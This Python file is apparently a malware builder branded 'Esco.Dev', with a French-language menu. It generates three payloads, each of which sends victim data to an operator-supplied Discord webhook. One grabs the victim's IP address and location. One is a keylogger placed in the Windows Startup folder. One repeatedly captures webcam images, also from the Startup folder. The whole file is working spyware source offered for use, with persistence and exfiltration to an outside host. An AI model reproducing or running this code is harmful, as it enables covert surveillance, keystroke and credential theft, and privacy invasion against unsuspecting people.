import os

try:
    from pystyle import Colorate, Colors, System, Center, Write, Anime
except:
    os.system("pip install pystyle")
try:
    from win10toast import ToastNotifier
except:
    os.system("pip install win10toast")


def init():
    os.system("title Esco.Dev")
    os.system("mode con: cols=110 lines=30")
    os.system("cls")
    init.ascii_art = '''
  ▄████████    ▄████████  ▄████████  ▄██████▄  
  ███    ███   ███    ███ ███    ███ ███    ███ 
  ███    █▀    ███    █▀  ███    █▀  ███    ███ 
 ▄███▄▄▄       ███        ███        ███    ███ 
▀▀███▀▀▀     ▀███████████ ███        ███    ███ 
  ███    █▄           ███ ███    █▄  ███    ███ 
  ███    ███    ▄█    ███ ███    ███ ███    ███ 
  ██████████  ▄████████▀  ████████▀   ▀██████▀  
                                               '''
    print(Colorate.DiagonalBackwards(Colors.blue_to_purple, Center.XCenter(init.ascii_art)))
    print(Colorate.DiagonalBackwards(Colors.white_to_red,
                                     Center.XCenter("[1] Addres Grabber [2]Keylogger [3]Cam Grabber")))
    list_choix = ["1", "2", "3"]
    init.choix = input("\n\n\nInsérer un nombre [>]")
    if init.choix not in list_choix:
        toast = ToastNotifier()
        toast.show_toast(
            "ValueError",
            f"Votre choix est Invalid!",
            duration=20,
            threaded=True,
        )
        os.system("cls")
        print(Center.Center(f"{init.choix} n'est pas accessible."))
    if init.choix == "1":
        Addres()
    if init.choix == "2":
        Keylogger()
    if init.choix == "3":
        Cam()


def Addres():
    webhook = input("\n\nWebhook url [>]")
    try:
        os.remove(os.getcwd() + "\\Address.py")
    except:
        pass
    with open("Address.pyw", "w") as f:
        codes = r'''
import requests
r = requests.get("http://ip-api.com/json").json()
r = ("Country: "+r["country"]+"\n City: "+r["city"]+"\n timezone: "+r["timezone"]+"\n IP: "+r["query"])
data = {
        "content": None,
        "embeds": [
            {
                "title":"Ip address de votre victime ''' + os.getlogin() + '''",
                "description": r,
                "url": "http://ip-api.com/json",
                "color": 16729856,
                "author": {
                    "name": "Esco.Dev",
                    "url": "https://upload.wikimedia.org/wikipedia/commons/thumb/5/59/Flag_of_Lebanon.svg/255px-Flag_of_Lebanon.svg.png",
                    "icon_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTt92YlOloz3nHpvsKCDDPRnhpXGWnkUwK_vQ&usqp=CAU"
                },
                "footer": {
                    "text": "Esco.Dev",
                    "icon_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTt92YlOloz3nHpvsKCDDPRnhpXGWnkUwK_vQ&usqp=CAU"
                },
            }
        ],
        "username": "Esco.Dev",
        "avatar_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTt92YlOloz3nHpvsKCDDPRnhpXGWnkUwK_vQ&usqp=CAU"
}
webhook = "''' + webhook + '''"
result = requests.post(webhook, json=data)

try:
    result.raise_for_status()
except requests.exceptions.HTTPError as err:
    print(err)
else:
    print("Payload delivered successfully, code {}.".format(result.status_code))'''
        f.write(codes)


def Keylogger():
    webhook = input("\n\nWebhook url [>]")
    counter = input("Entrer le nombre de keys que vous desirez")
    with open(
            f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Key.pyw",
            "w") as f:
        script = r'''
try:
    import os
    from pynput.keyboard import Listener
except:
    os.system("pip install pynput")
conter = 0

def keystorkes(key):
            global conter
            key = str(key).replace("'", "")

            if key == "Key.space":
                key = " "
            if key == "Key.shift_r":
                key = ""
            if key == "Key.enter":
                key = "\n"

            with open("log.txt", "a") as f:
                f.write(key)
                conter += 1
                if conter == ''' + counter + ''':
                    try:
                        from discord_webhook import DiscordWebhook
                    except:
                        os.system("pip install discord_webhook")

                    webhook = DiscordWebhook(
                        url="''' + webhook + '''",
                        username="Webhook with files")
                    # send two images
                    with open("log.txt", "rb") as f:
                        webhook.add_file(file=f.read(), filename='example.text')

                    response = webhook.execute()

with Listener(on_press=keystorkes) as l:
            l.join()'''
        f.write(script)


def Cam():
    webhook = input("\n\nWebhook url [>]")
    with open(
            f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\cam.pyw",
            "w") as f:
        script = r'''
try:
    import cv2, time, os
    from discord_webhook import DiscordWebhook
except:
    os.system("pip install opencv-python")
    os.system("pip install discord_webhook")
while True:
    camera_port = 0
    camera = cv2.VideoCapture(camera_port)
    time.sleep(0.1)
    return_value, image = camera.read()
    try:
        os.remove(f"C:\\Users\\{os.getlogin()}\\Desktop\\screenshot_2.png")
    except:
        pass
    cv2.imwrite(f"C:\\Users\\{os.getlogin()}\\Desktop\\screenshot_2.png", image)
    del (camera)  # so that others can use the camera as soon as possible
    webhook = DiscordWebhook(
        url="''' + webhook + '''",
        username="Webhook with files")
    # send two images
    with open(f"C:\\Users\\{os.getlogin()}\\Desktop\\screenshot_2.png", "rb") as f:
        webhook.add_file(file=f.read(), filename='example.text')

    response = webhook.execute()
    time.sleep(20)'''
        f.write(script)


init()
